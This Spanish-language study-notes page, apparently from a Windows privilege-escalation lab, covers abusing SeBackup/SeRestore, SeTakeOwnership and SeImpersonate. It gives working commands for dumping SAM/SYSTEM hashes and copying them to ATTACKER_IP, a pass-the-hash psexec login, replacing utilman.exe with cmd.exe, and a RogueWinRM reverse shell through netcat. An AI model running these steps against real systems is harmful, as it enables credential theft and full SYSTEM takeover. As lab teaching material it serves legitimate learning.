# Abusing dangerous privileges

Cada usuario tiene sus privilegios asignados en Windows, se puede ver así con: `whoami \priv`

### SeBackup / SeRestore

> Esto privilegios, permiten al usuario leer y escribir cualquier archivo del sistema, ignorando la DACL existente. La idea detrás de este privilegio es permitir al usuario realizar copias de seguridad sin requerir permisos de administrador.

Para obtener la consola con esos privilegios, tenemos que ejecutarla como administrador y introducir nuestra contraseña&#x20;

![](<../../.gitbook/assets/Pasted image 20250126105716.png>)&#x20;

Ahora vemos nuestros privilegios con `whoami \priv`

```
C:\> whoami /priv 

PRIVILEGES INFORMATION 
---------------------- 

Privilege Name                Description                    State
============================= ============================== ======== 
SeBackupPrivilege              Back up files and directories  Disabled SeRestorePrivilege             Restore files and directories  Disabled SeShutdownPrivilege            Shut down the system           Disabled SeChangeNotifyPrivilege        Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege  Increase a process working set Disabled
```

Con esto podríamos hacer una copia de seguridad de los hahes SAM y SYSTEM

```
C:\> reg save hklm\system C:\Users\victim\system.hive 
The operation completed successfully. 

C:\> reg save hklm\sam C:\Users\victim\sam.hive 
The operation completed successfully.
```

Esto cread 2 archivos que podemos compartirnos por SMB a la maquina kali (atacante) para crakearlos

```
user@attackerpc$ mkdir share 

user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username victim -password CopyMaster555 public share
```

Esto crea un recuso compartido a nivel de red llamado public, que apunta a share, nuestro directorio compartido. Que para acceder requiere el nombre de usuario y la contraseña de nuestra sesión actual de windows. Ahora podemos utilizar el comando `copy` para compartir el archvio que queramos:

```
C:\> copy C:\Users\victim\sam.hive \\ATTACKER_IP\public\ 
C:\> copy C:\Users\victim\system.hive \\ATTACKER_IP\public\
```

Ahora con `impacket` recuperamos los hahes de las contraseñas de estos users

```
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL 

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Ahora podemos utilizar el hash del Administrator para hacer un ataque `Pass-the-Hash` y tener acceso con privilegios SYSTEM con `psexec`

```
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.129.29 

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation 

[*] Requesting shares on 10.10.175.90..... 
[*] Found writable share ADMIN$ 
[*] Uploading file nfhtabqO.exe [*] Opening SVCManager on 10.10.175.90..... 
[*] Creating service RoLE on 10.10.175.90..... 
[*] Starting service RoLE..... 
[!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. 

C:\Windows\system32> whoami nt authority\system
```

### SeTakeOwnership

Este privilegio permite a un usuario tomar propiedad de cualquier objeto en el sistema, incluyendo archivos y claves de registro.

&#x20;![](<../../.gitbook/assets/Pasted image 20250126105716.png>)&#x20;

Lo primero abrir la terminal como administrador para lanzar `whoami \priv`

```
C:\> whoami /priv 

PRIVILEGES INFORMATION 
---------------------- 

Privilege Name                Description                    State
============================= ============================== ======== 
SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled

SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 

SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled

```

Ahora abusaremos de la `utilman.exe` para escalar el privilegio. Esta es una aplicación integrada de Windows que se utiliza para dar opciones de "Facilidad" en al pantalla de bloqueo

<figure><img src="../../.gitbook/assets/Pasted image 20250127115929.png" alt=""><figcaption></figcaption></figure>

Este se ejecuta con privilegios del Sistema, asi que si remplazamos el binario a cualquier payload, conseguiremos esos permiso

```
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): 
"C:\Windows\System32\Utilman.exe" 
now owned by user 
"WINPRIVESC2\thmtakeownership".
```

Ser el propietario de un fichero no significa necesariamente que tengas privilegios sobre él, pero siendo el propietario puedes asignarte los privilegios que necesites. Para dar a tu usuario permisos completos sobre `utilman.exe` puedes usar el siguiente comando:

```
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F 
processed file: Utilman.exe 
Successfully processed 1 files; Failed processing 0 files
```

Ahora solo hace falta sustituir el `utilman.exe` por `cmd.exe`

```
C:\Windows\System32\> copy cmd.exe utilman.exe 
	1 file(s) copied.
```

Ahora para activar el ultiman, solo hace falta darle al botón de lock de pantalla en el inicio

<figure><img src="../../.gitbook/assets/Pasted image 20250127125653.png" alt=""><figcaption></figcaption></figure>

&#x20;Y darle al botón de "Ease od access" que ejecuta `utilman.exe` -> ahora `cmd.exe` con privilegios de SISTEMA.

<figure><img src="../../.gitbook/assets/Pasted image 20250127130147.png" alt=""><figcaption></figcaption></figure>

### SeImpersonate / SeAssignPrimaryToken

En este caso, para hacer la escalada, necesitamos dos condiciones: 1º Crear un proceso para que los usuarios puedan conectarse y autenticarse para suplantarlo 2º Encontrar una forma de forzar a los usuarios con privilegios (Adminsitrator) a conectarse y autenticarse en el proceso malicioso generado

Utilizare el exploit RogueWinRM

Asumiendo que ya hemos comprometido un sitio web que se ejecuta en IIS y que hemos plantado un web shell en `http://10.10.56.114/`

<figure><img src="../../.gitbook/assets/Pasted image 20250127130641.png" alt=""><figcaption></figcaption></figure>

Para utilizar `RogueWinRM`, primero necesitamos subir el exploit a la máquina victima.

Ahora me pongo en escucha por `nc` en mi maquina de atacante `user@attackerpc$ nc -lvp 4442`

Y lanzo el exploit desde esa webshell

`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`

<figure><img src="../../.gitbook/assets/Pasted image 20250127135702.png" alt=""><figcaption></figcaption></figure>

```
user@attackerpc$ nc -lvp 4442 
Listening on 0.0.0.0 4442 
Connection received on 10.10.175.90 49755 
Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. 

c:\windows\system32\inetsrv>whoami 
nt authority\system
```
